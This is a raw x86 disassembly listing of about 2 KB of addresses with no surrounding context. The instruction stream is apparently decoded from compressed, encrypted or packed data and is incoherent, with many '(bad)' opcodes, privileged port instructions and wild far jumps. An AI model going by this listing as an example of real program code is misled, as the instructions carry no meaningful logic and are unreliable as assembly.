  4139ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139ed:	jmp    0x413a3c
  4139ef:	jecxz  0x413a40
  4139f1:	lods   eax,DWORD PTR ds:[esi]
  4139f2:	adc    BYTE PTR [eax-0x62],dl
  4139f5:	(bad)  [edx]
  4139f7:	lods   eax,DWORD PTR ds:[esi]
  4139f8:	pop    ecx
  4139f9:	out    0xfd,al
  4139fb:	jp     0x413a0b
  4139fd:	(bad)  
  4139fe:	test   BYTE PTR [edi+0x5f55cfd0],ah
  413a04:	cmp    al,0x8
  413a06:	xchg   esi,eax
  413a07:	fimul  WORD PTR [eax+0x32e5e701]
  413a0d:	dec    ebp
  413a0e:	mov    DWORD PTR [edi],ecx
  413a10:	and    al,0xcb
  413a12:	fmul   DWORD PTR [eax+0x1fd226c5]
  413a18:	fcom   QWORD PTR [ebp+ebx*2+0x48]
  413a1c:	mov    bh,0xa2
  413a1e:	fstp   QWORD PTR [ecx+ecx*4]
  413a21:	cmp    BYTE PTR [ecx-0x739d3acc],0x86
  413a28:	sbb    esp,DWORD PTR [esi]
  413a2a:	push   edi
  413a2b:	sti    
  413a2c:	stos   DWORD PTR es:[edi],eax
  413a2d:	pop    ebp
  413a2e:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  413a30:	add    dl,ch
  413a32:	mov    WORD PTR [ebx],fs
  413a34:	pushf  
  413a35:	mov    esi,0x38b234f6
  413a3a:	mov    ds:0x853d868d,eax
  413a3f:	outs   dx,DWORD PTR ds:[esi]
  413a40:	xchg   edx,eax
  413a41:	mov    bh,0xe6
  413a43:	shl    DWORD PTR [edi+0x55f5ef80],cl
  413a49:	dec    edi
  413a4a:	in     eax,dx
  413a4b:	fcomp  st(3)
  413a4d:	ds (bad) 
  413a4f:	mov    bl,0x8e
  413a51:	ret    
  413a52:	xor    ebx,DWORD PTR [eax]
  413a54:	sahf   
  413a55:	out    0x57,al
  413a57:	pop    ecx
  413a58:	loop   0x4139de
  413a5a:	pop    ebp
  413a5b:	jns    0x413a2e
  413a5d:	inc    ebx
  413a5e:	ficomp WORD PTR [ecx+0x4541cbd8]
  413a64:	or     dl,BYTE PTR [esp+edi*4]
  413a67:	add    edi,DWORD PTR [esp+edi*8]
  413a6a:	fnstsw ax
  413a6c:	aaa    
  413a6d:	or     eax,0xefae3c36
  413a72:	mov    ds:0x997e7319,eax
  413a77:	mov    bh,0x16
  413a79:	int    0x39
  413a7b:	and    eax,0x63ed38f
  413a80:	mov    esp,0x5d6b6c18
  413a85:	dec    ebp
  413a86:	sub    al,0xa6
  413a88:	icebp  
  413a89:	jbe    0x413a3d
  413a8b:	shl    DWORD PTR [edi+0x5d],1
  413a8e:	cli    
  413a8f:	push   esp
  413a90:	ror    BYTE PTR [ebx],1
  413a92:	and    esi,DWORD PTR [eax]
  413a94:	and    bl,BYTE PTR [edx+0x6]
  413a97:	push   ebp
  413a98:	enter  0x8606,0xed
  413a9c:	xchg   ebx,eax
  413a9d:	in     al,0x4d
  413a9f:	call   0x3b6ff49f
  413aa4:	jp     0x413ae2
  413aa6:	mul    bl
  413aa8:	push   es
  413aa9:	call   0xca17:0x11ed49c8
  413ab0:	cmp    DWORD PTR [ebx],esi
  413ab2:	and    edx,DWORD PTR [ecx+edi*8-0x3a]
  413ab6:	imul   ebx,DWORD PTR [ebp+0x798b8256],0x4c7b37da
  413ac0:	cld    
  413ac1:	mov    gs,WORD PTR [bx+di-0x4de8]
  413ac6:	into   
  413ac7:	pop    esp
  413ac8:	adc    DWORD PTR [edi+eiz*1],ebp
  413acb:	sub    BYTE PTR [ebp+0x21],0xc8
  413acf:	xor    DWORD PTR [edi-0x51adef20],esp
  413ad5:	sbb    eax,0xe9eaefae
  413ada:	or     BYTE PTR [esi+0x47a23d5c],0x85
  413ae1:	xor    esp,0xffffffac
  413ae4:	xlat   BYTE PTR ds:[ebx]
  413ae5:	dec    BYTE PTR [eax-0x18726038]
  413aeb:	inc    edi
  413aec:	mov    WORD PTR [ebp+esi*2+0x48],cs
  413af0:	cmp    esi,ebp
  413af2:	shl    ah,0x33
  413af5:	sbb    BYTE PTR [eax],cl
  413af7:	sub    esp,DWORD PTR [ecx]
  413af9:	mov    eax,ds:0x736f3e73
  413afe:	cwde   
  413aff:	js     0x413abf
  413b01:	ins    DWORD PTR es:[edi],dx
  413b02:	xchg   esi,eax
  413b03:	(bad)  
  413b04:	(bad)  
  413b05:	or     BYTE PTR [edx],al
  413b07:	jbe    0x413aaf
  413b09:	xchg   edi,eax
  413b0a:	cwde   
  413b0b:	mov    eax,DWORD PTR [ebx-0xc869636]
  413b11:	mov    eax,DWORD PTR [esi-0x38e6ba8a]
  413b17:	fsubr  st(4),st
  413b19:	inc    eax
  413b1a:	call   0xc2a0:0x5ab7b3bb
  413b21:	call   0xcc3c:0x9e361715
  413b28:	ss adc eax,0xf519e69
  413b2e:	fldcw  WORD PTR [esi+0x1b]
  413b31:	scas   al,BYTE PTR es:[edi]
  413b32:	lds    ebx,FWORD PTR ds:[edi-0x72]
  413b36:	repz fnstenv [ecx+0x31469469]
  413b3d:	inc    ecx
  413b3e:	adc    edi,0xffffffdd
  413b41:	xchg   DWORD PTR [edx],ebx
  413b43:	xchg   DWORD PTR ds:0x839e98c6,ebx
  413b49:	jmp    0x340e:0x46b06a19
  413b50:	mov    ch,0x84
  413b52:	enter  0xc7ac,0x39
  413b56:	stos   DWORD PTR es:[edi],eax
  413b57:	mov    DWORD PTR [ebx+eax*4],eax
  413b5a:	daa    
  413b5b:	rcl    esi,0xbc
  413b5e:	fisub  DWORD PTR [esi+ebp*8]
  413b61:	cli    
  413b62:	int3   
  413b63:	mov    edx,0x285f439e
  413b68:	cdq    
  413b69:	sbb    BYTE PTR [edi-0x5fe3af02],dh
  413b6f:	stc    
  413b70:	inc    ebp
  413b71:	add    dl,dl
  413b73:	dec    edx
  413b74:	into   
  413b75:	adc    esp,ebx
  413b77:	push   esp
  413b78:	pop    ecx
  413b79:	dec    ebp
  413b7a:	leave  
  413b7b:	jne    0x413b5f
  413b7d:	in     al,dx
  413b7e:	out    dx,al
  413b7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b80:	mov    ds:0x5d2ddb9,al
  413b85:	pop    eax
  413b86:	mov    dl,0x71
  413b88:	popa   
  413b89:	add    eax,0x9b50cc8
  413b8e:	jge    0x413bfc
  413b90:	cmp    BYTE PTR [edi],dl
  413b92:	fidiv  DWORD PTR [ecx+0x2b64dfd1]
  413b98:	adc    edx,DWORD PTR [eax-0x52]
  413b9b:	mov    ecx,0xd2fd8f79
  413ba0:	lea    esi,[edi-0x59ea5d19]
  413ba6:	mov    dl,0x89
  413ba8:	adc    esp,DWORD PTR [edx]
  413baa:	pop    ebp
  413bab:	jp     0x413be2
  413bad:	sub    eax,0x8e05881e
  413bb2:	fnsave [ebp-0x47]
  413bb5:	retf   
  413bb6:	pop    ds
  413bb7:	in     eax,dx
  413bb8:	adc    al,0xeb
  413bba:	scas   eax,DWORD PTR es:[edi]
  413bbb:	(bad)  
  413bbc:	xchg   edi,eax
  413bbd:	leave  
  413bbe:	lods   al,BYTE PTR ds:[esi]
  413bbf:	jbe    0x413b75
  413bc1:	mov    bl,dh
  413bc3:	jle    0x413c28
  413bc5:	das    
  413bc6:	cld    
  413bc7:	shl    BYTE PTR [ebp+0x67a86e03],1
  413bcd:	pop    es
  413bce:	ins    DWORD PTR es:[edi],dx
  413bcf:	jbe    0x413b8c
  413bd1:	jmp    0xcb0e:0xb9f838e2
  413bd8:	or     DWORD PTR [ebx+0xb],edx
  413bdb:	mov    bh,0xf4
  413bdd:	fild   DWORD PTR es:[edx+eax*2+0x65]
  413be2:	fiadd  DWORD PTR [edi-0x8]
  413be5:	adc    edi,ebp
  413be7:	sub    BYTE PTR [ecx-0x31],ch
  413bea:	stos   BYTE PTR es:[edi],al
  413beb:	imul   ebx
  413bed:	aaa    
  413bee:	sbb    BYTE PTR [esi-0x16],dh
  413bf1:	sub    BYTE PTR [edi+eiz*2],al
  413bf4:	fbstp  TBYTE PTR [ecx+eiz*8-0x2f]
  413bf8:	mov    edi,0xf17adee3
  413bfd:	pop    ebp
  413bfe:	xor    ebx,DWORD PTR [ecx]
  413c00:	mov    ds:0x192891d7,al
  413c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c06:	fdiv   st,st(0)
  413c08:	fsubr  QWORD PTR [edi+eax*2]
  413c0b:	add    cl,BYTE PTR [ebp+0x5deed574]
  413c11:	and    dl,BYTE PTR [eax+0x5c]
  413c14:	jne    0x413ba1
  413c16:	adc    esp,DWORD PTR [eax+eax*4-0x435df30e]
  413c1d:	into   
  413c1e:	xor    bh,BYTE PTR [esi-0x7]
  413c21:	loop   0x413c1a
  413c23:	jge    0x413bfd
  413c25:	push   edx
  413c26:	mov    edi,DWORD PTR [eax-0x7af406d3]
  413c2c:	stc    
  413c2d:	cmp    ebp,DWORD PTR [eax]
  413c2f:	push   ecx
  413c30:	stc    
  413c31:	push   edi
  413c32:	lods   eax,DWORD PTR ds:[esi]
  413c33:	into   
  413c34:	jmp    0x1fab1c89
  413c39:	xor    DWORD PTR [ecx-0x4a349f94],ecx
  413c3f:	lock lods al,BYTE PTR ds:[esi]
  413c41:	lds    ebx,FWORD PTR [edi+edx*2]
  413c44:	rcr    BYTE PTR [eax+0x33cca4ca],cl
  413c4a:	push   0x3f
  413c4c:	push   es
  413c4d:	jle    0x413bf4
  413c4f:	or     eax,0x3ebb088
  413c54:	sbb    al,0xf8
  413c56:	out    0xdb,eax
  413c58:	test   al,0x47
  413c5a:	xchg   ebp,eax
  413c5b:	stos   DWORD PTR es:[edi],eax
  413c5c:	(bad)  
  413c5d:	mov    ah,dl
  413c5f:	call   0x272e:0x57649233
  413c66:	add    BYTE PTR [edi],ch
  413c68:	inc    ecx
  413c69:	jle    0x413c2a
  413c6b:	adc    eax,0x86b3a7bd
  413c70:	std    
  413c71:	and    ebx,0xa29a7821
  413c77:	push   edi
  413c78:	push   ss
  413c79:	xor    al,0x40
  413c7b:	inc    ecx
  413c7c:	push   ss
  413c7d:	cdq    
  413c7e:	in     al,0x29
  413c80:	les    ebp,FWORD PTR [ecx+0x53]
  413c83:	fcmovnbe st,st(4)
  413c85:	mov    cl,0x9a
  413c87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c88:	imul   eax,DWORD PTR [edx-0x18023132],0x1b
  413c8f:	mov    ds:0x12ac0253,eax
  413c94:	add    eax,0x84330289
  413c99:	dec    ebp
  413c9a:	push   ecx
  413c9b:	adc    eax,0x851d2eec
  413ca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ca1:	lods   eax,DWORD PTR ds:[esi]
  413ca2:	xchg   ebp,edi
  413ca4:	lods   eax,DWORD PTR ds:[esi]
  413ca5:	adc    DWORD PTR [ebx-0x3],edi
  413ca8:	pop    eax
  413ca9:	xchg   edx,eax
  413caa:	mov    al,al
  413cac:	xor    BYTE PTR [ebx+0x2ad50f89],bl
  413cb2:	ficomp WORD PTR [esi]
  413cb4:	iret   
  413cb5:	dec    esi
  413cb6:	push   edi
  413cb7:	dec    edx
  413cb8:	aam    0x63
  413cba:	retf   
  413cbb:	cmp    eax,0x9ebe0b7
  413cc0:	imul   BYTE PTR [eax-0x57]
  413cc3:	jl     0x413d3c
  413cc5:	cwde   
  413cc6:	xchg   esi,eax
  413cc7:	inc    esi
  413cc8:	and    BYTE PTR fs:[edi-0x5d],0x9d
  413ccd:	sar    cl,1
  413ccf:	inc    edx
  413cd0:	fidiv  WORD PTR [esi-0x49b20349]
  413cd6:	fidiv  DWORD PTR [edi]
  413cd8:	outs   dx,DWORD PTR ds:[esi]
  413cd9:	ds add ah,BYTE PTR ss:[eax-0x18]
  413cde:	sti    
  413cdf:	(bad)  
  413ce0:	mov    ds:0x2b2407e0,al
  413ce5:	iret   
  413ce6:	sub    BYTE PTR [esi],0x94
  413ce9:	hlt    
  413cea:	push   edx
  413ceb:	popa   
  413cec:	or     edi,DWORD PTR [ecx]
  413cee:	int    0x3d
  413cf0:	mov    cl,bl
  413cf2:	enter  0xab46,0x6d
  413cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cf7:	mov    DWORD PTR [edx],ebp
  413cf9:	ret    
  413cfa:	ss call 0x1d17:0x25302460
  413d02:	(bad)
  413d07:	ret    0x42ae
  413d0a:	and    esp,DWORD PTR [ecx-0x1d]
  413d0d:	sahf   
  413d0e:	aas    
  413d0f:	(bad)  
  413d10:	sub    esi,eax
  413d12:	sbb    al,0xc3
  413d14:	pop    ebx
  413d15:	inc    BYTE PTR [edi]
  413d17:	jae    0x413cd2
  413d19:	inc    edi
  413d1a:	jg     0x413cac
  413d1c:	lods   ax,WORD PTR ds:[esi]
  413d1e:	ror    BYTE PTR [esi],1
  413d20:	jmp    0xde8b:0xfc77fa58
  413d27:	mov    esi,0xe8c888bd
  413d2c:	add    eax,0xbfb970be
  413d31:	mov    ebx,0x22b22ee1
  413d36:	and    eax,DWORD PTR [ebp+0x70]
  413d39:	test   al,0xd7
  413d3b:	xchg   edi,eax
  413d3c:	add    esp,DWORD PTR [edx]
  413d3e:	push   edi
  413d3f:	jg     0x413cff
  413d41:	aaa    
  413d42:	lods   eax,DWORD PTR ds:[esi]
  413d43:	int    0x4b
  413d45:	inc    ebp
  413d46:	cli    
  413d47:	add    DWORD PTR [ecx+0x25],0x59
  413d4b:	(bad)  
  413d4c:	shl    al,cl
  413d4e:	div    BYTE PTR [edx+0x1f478519]
  413d54:	cli    
  413d55:	into   
  413d56:	jno    0x413dac
  413d58:	sti    
  413d59:	(bad)  
  413d5a:	popa   
  413d5b:	xor    DWORD PTR [eax],esp
  413d5d:	sbb    eax,0xac916b4
  413d62:	aas    
  413d63:	loopne 0x413d80
  413d65:	sub    cl,BYTE PTR [edx-0x5d]
  413d68:	adc    eax,0xaa3168b6
  413d6d:	mov    esp,0xbf70dec9
  413d72:	jg     0x413d75
  413d74:	sub    BYTE PTR [esi-0x22],0x83
  413d78:	or     DWORD PTR [eax],edx
  413d7a:	bound  ebp,QWORD PTR [esi]
  413d7c:	dec    ecx
  413d7d:	cli    
  413d7e:	inc    eax
  413d7f:	xor    cl,BYTE PTR [ebp+0x3293ff76]
  413d85:	adc    al,BYTE PTR [ebx+0x5e0a9987]
  413d8b:	scas   eax,DWORD PTR es:[edi]
  413d8c:	test   al,0xf1
  413d8e:	cmc    
  413d8f:	and    edx,edx
  413d91:	inc    ebp
  413d92:	fld    DWORD PTR [ecx-0x509251b5]
  413d98:	retf   0xef83
  413d9b:	pop    esi
  413d9c:	push   esp
  413d9d:	ret    0x8d57
  413da0:	cmp    BYTE PTR [ecx],cl
  413da2:	ret    
  413da3:	mul    BYTE PTR [edi+0xd6d2d57]
  413da9:	retf   0x6c71
  413dac:	or     DWORD PTR [edi-0x2c],ebp
  413daf:	sbb    bh,ah
  413db1:	add    bl,bl
  413db3:	and    BYTE PTR [edx],0x8
  413db6:	and    BYTE PTR [esp+ebp*1],dl
  413db9:	(bad)  
  413dba:	clc    
  413dbb:	jns    0x413da3
  413dbd:	xor    ecx,DWORD PTR [eax+0x3b]
  413dc0:	mov    ds:0x753ad18c,al
  413dc5:	enter  0x8752,0x59
  413dc9:	shl    BYTE PTR [eax+0x1],cl
  413dcc:	push   edi
  413dcd:	nop    DWORD PTR [eax]
  413dd0:	xchg   esi,eax
  413dd1:	mov    ds:0x55b7560a,al
  413dd6:	mov    ebp,0xe0817373
  413ddb:	mov    cl,0x16
  413ddd:	jg     0x413e23
  413ddf:	pop    ss
  413de0:	js     0x413df5
  413de2:	sahf   
  413de3:	adc    dh,BYTE PTR [edx-0x51]
  413de6:	jl     0x413e08
  413de8:	sti    
  413de9:	mov    ds:0xa8cc3253,al
  413dee:	push   0xd7f19ce
  413df3:	push   ebp
  413df4:	mov    al,ds:0x84c1ced5
  413df9:	int    0x51
  413dfb:	fwait
  413dfc:	mov    al,0x66
  413dfe:	add    eax,0x9ca413f2
  413e03:	mov    WORD PTR [ebx+0x571d0ebc],es
  413e09:	adc    eax,DWORD PTR [esi-0x4d5d39b7]
  413e0f:	punpckhdq mm5,mm3
  413e12:	mov    ds:0x64a81b1a,eax
  413e17:	xor    eax,0x35377348
  413e1c:	in     eax,0x7f
  413e1e:	inc    esi
  413e1f:	mov    eax,0xb9a97282
  413e24:	xor    eax,0xdc7dc32c
  413e29:	jge    0x413ded
  413e2b:	push   ds
  413e2c:	icebp  
  413e2d:	xor    al,0x47
  413e2f:	sub    eax,0x97f5f4bd
  413e34:	dec    esp
  413e35:	stc    
  413e36:	push   es
  413e37:	out    dx,eax
  413e38:	add    bh,BYTE PTR [esi]
  413e3a:	mov    eax,ds:0x9e105c29
  413e3f:	jno    0x413e8b
  413e41:	mov    eax,0x1b8e54e5
  413e46:	mov    ds:0x7b462ea,al
  413e4b:	xchg   esi,eax
  413e4c:	fsub   DWORD PTR [edx]
  413e4e:	jl     0x413e3a
  413e50:	or     al,0xc7
  413e52:	mov    bh,0x37
  413e54:	pop    esi
  413e55:	xchg   esp,eax
  413e56:	lods   eax,DWORD PTR ds:[esi]
  413e57:	fmul   st,st(3)
  413e59:	adc    DWORD PTR [edi],ecx
  413e5b:	mov    ebp,0xd88596fa
  413e60:	mov    ecx,0xaf887f88
  413e65:	scas   eax,DWORD PTR es:[edi]
  413e66:	adc    eax,0x267e2fde
  413e6b:	push   cs
  413e6c:	pop    edx
  413e6d:	mov    ah,0x82
  413e6f:	cmp    al,0x68
  413e71:	and    eax,0x7d1ae28e
  413e76:	dec    esi
  413e77:	add    al,0x8c
  413e79:	retf   
  413e7a:	sti    
  413e7b:	stc    
  413e7c:	sahf   
  413e7d:	fld    TBYTE PTR [ecx-0x2]
  413e80:	xchg   DWORD PTR [edi+0x5590bbe4],eax
  413e86:	and    BYTE PTR [eax-0x29],cl
  413e89:	pop    edx
  413e8a:	sbb    edx,0x8b523786
  413e90:	cmp    eax,0x7040f1e9
  413e95:	sbb    al,0x17
  413e97:	fst    DWORD PTR [edx]
  413e99:	mov    ah,0x4f
  413e9b:	pop    ss
  413e9c:	rcl    edi,1
  413e9e:	dec    ebp
  413e9f:	pop    ss
  413ea0:	xchg   esi,eax
  413ea1:	outs   dx,BYTE PTR ds:[esi]
  413ea2:	cli    
  413ea3:	int3   
  413ea4:	mov    WORD PTR [ecx],es
  413ea6:	and    eax,0x32d090a1
  413eab:	pop    edx
  413eac:	jmp    DWORD PTR [ebx+0x1c]
  413eaf:	mov    ecx,0xc607c568
  413eb4:	xchg   edx,eax
  413eb5:	or     eax,edx
  413eb7:	mov    esp,0x9a85f9d4
  413ebc:	dec    esp
  413ebd:	and    al,ah
  413ebf:	mov    ebp,0xf5469402
  413ec4:	fiadd  WORD PTR [ecx-0x5d70e40f]
  413eca:	call   0xbd18:0x1154b6dc
  413ed1:	hlt    
  413ed2:	and    BYTE PTR [eax],dl
  413ed4:	in     al,0x22
  413ed6:	mov    dh,BYTE PTR [edx]
  413ed8:	daa    
  413ed9:	(bad)  
  413edb:	stc    
  413edc:	cli    
  413edd:	or     ah,BYTE PTR [ecx+0x53]
  413ee0:	(bad)  [edx+edx*2-0x71]
  413ee4:	jae    0x413e8d
  413ee6:	cli    
  413ee7:	inc    BYTE PTR [ebx]
  413ee9:	xor    eax,0x7c95755b
  413eee:	in     al,0xdc
  413ef0:	cmc    
  413ef1:	xor    dh,dl
  413ef3:	jbe    0x413f17
  413ef5:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  413ef7:	sar    DWORD PTR [eax-0x70],1
  413efa:	jns    0x413e92
  413efc:	sub    ch,BYTE PTR [ecx-0xe0fe119]
  413f02:	loop   0x413f4f
  413f04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f05:	jl     0x413eb0
  413f07:	mov    eax,ds:0x5e4ab6a0
  413f0c:	sbb    DWORD PTR [ebx+0x6d],esi
  413f0f:	dec    esp
  413f10:	pop    ds
  413f11:	cmp    dl,0x8c
  413f14:	fcmovu st,st(3)
  413f16:	mov    edx,0x88cf73a5
  413f1b:	pushw  0xffc2
  413f1e:	and    DWORD PTR [eax-0xc],0xd16010a
  413f25:	xchg   edi,eax
  413f26:	shl    ch,cl
  413f28:	mov    al,0x10
  413f2a:	mov    esi,DWORD PTR [edi+0x7d909137]
  413f30:	xor    cl,ah
  413f32:	jbe    0x413f86
  413f34:	jmp    0x4993a84c
  413f39:	jnp    0x413f95
  413f3b:	fs js  0x413f0e
  413f3e:	sar    DWORD PTR [edx+0x70],cl
  413f41:	popa   
  413f42:	mov    ebp,0x6a0efc8a
  413f47:	popa   
  413f48:	aaa    
  413f49:	push   edx
  413f4a:	daa    
  413f4b:	mov    ds:0x8872af34,eax
  413f50:	fs lahf 
  413f52:	std    
  413f53:	push   es
  413f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f55:	ret    
  413f56:	xchg   ebp,eax
  413f57:	mov    fs,ebx
  413f59:	sub    al,0x5e
  413f5b:	jecxz  0x413f68
  413f5d:	push   edx
  413f5e:	bound  esi,QWORD PTR [edx+0xb5bb75e]
  413f64:	mov    ebx,0xf6dcb7bb
  413f69:	sub    DWORD PTR [ebx],eax
  413f6b:	ss dec ebx
  413f6d:	mov    ebp,DWORD PTR [ebp-0x70cb441d]
  413f73:	jecxz  0x413f53
  413f75:	mov    al,0xf5
  413f77:	div    bh
  413f79:	push   ds
  413f7a:	sahf   
  413f7b:	dec    ebx
  413f7c:	mov    edi,0x3a2f28fa
  413f81:	mov    eax,ds:0xc449ce35
  413f86:	sbb    DWORD PTR [ecx+0x19],ecx
  413f89:	sub    al,0xfc
  413f8c:	cli    
  413f8d:	retf   
  413f8e:	ss push ss
  413f90:	sbb    BYTE PTR [ebx-0x25c8d3d8],dh
  413f96:	scas   al,BYTE PTR es:[edi]
  413f97:	(bad)  
  413f99:	jl     0x413fcc
  413f9b:	and    edx,edi
  413f9d:	clc    
  413f9e:	pop    edi
  413f9f:	call   0x5c9e12db
  413fa4:	mov    BYTE PTR [eax+eiz*2],ch
  413fa7:	lds    edi,FWORD PTR [edx-0x3d8be0e8]
  413fad:	jmp    0x92bc:0x8c21ee0
  413fb4:	aas    
  413fb5:	mov    ecx,0xe51a12fb
  413fba:	fadd   QWORD PTR [esi*2+0x402b18b8]
  413fc1:	std    
  413fc2:	fld    st(1)
  413fc4:	jno    0x413ff2
  413fc6:	cmp    eax,0x3850b6ea
  413fcb:	xor    eax,0xc3acc6ce
  413fd0:	mov    ah,0xfa
  413fd2:	sub    al,0x71
  413fd4:	mul    BYTE PTR [edx+esi*1]
  413fd7:	inc    eax
  413fd8:	daa    
  413fd9:	mov    gs,WORD PTR [esi+0x1d]
  413fdc:	jno    0x413fc9
  413fde:	push   ecx
  413fdf:	xor    dh,BYTE PTR [esp+edx*1-0x13]
  413fe3:	stos   BYTE PTR es:[edi],al
  413fe4:	cdq    
  413fe5:	or     dh,BYTE PTR [edx-0x65188d7]
  413feb:	lods   al,BYTE PTR ds:[esi]
  413fec:	cmp    al,0xb3
  413fee:	mov    edx,0x1a64e01
  413ff3:	(bad)  
  413ff4:	fld    QWORD PTR [ebx-0x3140a4de]
  413ffa:	sbb    DWORD PTR [ebp+ebp*4+0x1d3699d8],0x979c5ed9
  414005:	cmp    eax,0x6e0b1944
  41400a:	aad    0x73
  41400c:	setl   BYTE PTR [ecx+0x74]
  414010:	popa   
  414011:	scas   eax,DWORD PTR es:[edi]
  414012:	data16 sar BYTE PTR es:[ebp+0x2a],cl
  414017:	sub    BYTE PTR [edx],bl
  414019:	xchg   edx,eax
  41401a:	aam    0x7f
  41401c:	cmp    DWORD PTR [ebx+0xb],0x5d
  414020:	icebp  
  414021:	cmp    esp,DWORD PTR [edx+0x4b]
  414024:	pop    ecx
  414025:	cmp    al,0xa3
  414027:	fcmovnu st,st(4)
  414029:	arpl   WORD PTR [edi+eax*2+0x1],bx
  41402d:	test   DWORD PTR [ebx],edx
  41402f:	and    edx,DWORD PTR [edi+0x67]
  414032:	and    eax,0xc16edac1
  414037:	or     BYTE PTR [eax+0x7895bc1c],0x5a
  41403e:	jbe    0x4140a7
  414040:	dec    DWORD PTR [edi]
  414042:	(bad)  
  414043:	scas   eax,DWORD PTR es:[edi]
  414044:	fmul   DWORD PTR [esi-0x1220559e]
  41404a:	ret    0xdb7b
  41404d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41404e:	rcl    DWORD PTR [edx-0x795c074f],1
  414054:	rcl    BYTE PTR [edi-0x737e3aa4],0xf4
  41405b:	push   edx
  41405c:	jl     0x4140c4
  41405e:	or     eax,0x666a206e
  414063:	js     0x41400c
  414065:	pop    ebx
  414066:	mov    ah,0x64
  414068:	add    bh,0xfb
  41406b:	cmp    BYTE PTR [edi+ebx*2],cl
  41406e:	aaa    
  41406f:	xchg   ecx,eax
  414070:	pushf  
  414071:	ficom  DWORD PTR [ebp-0x2b70c296]
  414077:	or     eax,0xf887479f
  41407c:	fistp  WORD PTR [ebp-0xb]
  41407f:	dec    ecx
  414080:	or     DWORD PTR [eax+ebp*4],esi
  414083:	in     eax,0x3d
  414085:	cld    
  414086:	and    ecx,ecx
  414088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414089:	add    BYTE PTR [ecx+0x4ffc9c],0xc6
  414090:	mov    ecx,0x6ddb5021
  414095:	icebp  
  414096:	mov    ebx,0x2cd73942
  41409b:	xchg   esi,eax
  41409c:	xor    al,0x49
  41409e:	sar    ecx,0x22
  4140a1:	xor    eax,0xa1c28284
  4140a6:	les    esp,FWORD PTR [edi+0x73567afc]
  4140ac:	ret    
  4140ad:	pop    ebx
  4140ae:	dec    eax
  4140af:	hlt    
  4140b0:	mov    cl,0x4d
  4140b2:	inc    eax
  4140b3:	repnz in eax,0xa1
  4140b6:	clc    
  4140b7:	test   BYTE PTR [ebp-0x57],cl
  4140ba:	and    esp,edx
  4140bc:	fidivr WORD PTR [esp+edx*4]
  4140bf:	xor    BYTE PTR [esi+esi*2-0x15],0xd4
  4140c4:	jb     0x414093
  4140c6:	lds    ecx,FWORD PTR [edx+0xa785147]
  4140cc:	imul   ebp,DWORD PTR [edi+0x7b],0xf23f94f7
  4140d3:	out    dx,al
  4140d4:	push   esp
  4140d5:	les    eax,FWORD PTR [esi]
  4140d7:	les    ebx,FWORD PTR [esi]
  4140d9:	xor    eax,0x3aec1854
  4140de:	sbb    ecx,ebx
  4140e0:	xlat   BYTE PTR ds:[ebx]
  4140e1:	popa   
  4140e2:	inc    eax
  4140e3:	les    esp,FWORD PTR [edi+0x29857211]
  4140e9:	add    al,0x3a
  4140eb:	pop    edx
  4140ec:	adc    ebx,esp
  4140ee:	cdq    
  4140ef:	jne    0x41408a
  4140f1:	test   eax,0xa8318224
  4140f6:	ret    
  4140f7:	push   ebp
  4140f8:	ds push eax
  4140fa:	int3   
  4140fb:	mov    DWORD PTR [ecx+eiz*8+0x4e2358ba],0xa762ea6f
  414106:	popa   
  414107:	mov    al,ds:0x4fda4f72
  41410c:	jbe    0x4140d1
  41410e:	jns    0x414097
  414110:	inc    ebp
  414111:	mov    eax,DWORD PTR [edx-0x508f823a]
  414117:	dec    eax
  414118:	ficom  WORD PTR [edi-0x7accd55e]
  41411e:	test   eax,0x14f90fed
  414123:	iret   
  414124:	jp     0x4140d8
  414126:	xor    cl,0x25
  414129:	sub    al,0xbe
  41412b:	in     al,0xbd
  41412d:	jb     0x41411a
  41412f:	mov    ?,WORD PTR [edx-0x78d30377]
  414135:	call   0x1c16:0xd5842b62
  41413c:	je     0x41414c
  41413e:	add    ebx,esp
  414140:	mov    edi,0x53f251c1
  414145:	jp     0x414132
  414147:	xchg   BYTE PTR [edx],dl
  414149:	or     BYTE PTR [eax-0x26],dl
  41414c:	mov    eax,0xe0634196
  414151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414152:	mov    ch,0x68
  414154:	icebp  
  414155:	popf   
  414156:	outs   dx,DWORD PTR ds:[esi]
  414157:	pop    ebx
  414158:	pop    es
  414159:	sub    eax,0x1a196a9f
  41415e:	mov    al,ds:0x93f20d81
  414163:	pop    ecx
  414164:	mov    ebp,0xa54b11c3
  414169:	out    dx,eax
  41416a:	fiadd  WORD PTR [edx-0x58e4cf78]
  414170:	or     dh,BYTE PTR [eax]
  414172:	pop    edx
  414173:	mov    ecx,0x640d1bcb
  414178:	popa   
  414179:	gs int3 
  41417b:	ret    
  41417c:	xchg   edi,eax
  41417d:	repnz out 0xa8,eax
  414180:	push   edx
  414181:	adc    al,0x77
  414183:	ds clc 
  414185:	mov    cl,0xef
  414187:	leave  
  414188:	es xchg ebx,eax
  41418a:	jbe    0x4141c2
  41418c:	pxor   mm6,QWORD PTR [ecx-0xd7875a5]
  414193:	popf   
  414194:	jp     0x414201
  414196:	nop
  414197:	pop    ecx
  414198:	frstor [edi]
  41419a:	mov    dh,BYTE PTR [ebx-0x6ee63a47]
  4141a0:	dec    esi
  4141a1:	call   0x3b756a98
  4141a6:	add    eax,0x518319a0
  4141ab:	in     eax,0x4a
  4141ad:	(bad)  
  4141ae:	push   edi
  4141af:	int    0x9a
  4141b1:	fcmovnbe st,st(0)
  4141b3:	imul   edi,DWORD PTR [ebx-0x25],0x54bbd599
  4141ba:	cmp    DWORD PTR [esi+0x6b],ecx
  4141bd:	lods   eax,DWORD PTR ds:[esi]
  4141be:	and    ebx,eax
  4141c0:	rcr    DWORD PTR [ecx+eiz*1+0x2a],cl
  4141c4:	jge    0x414163
  4141c6:	pop    edi
  4141c7:	sbb    esp,DWORD PTR [edi+0xb]
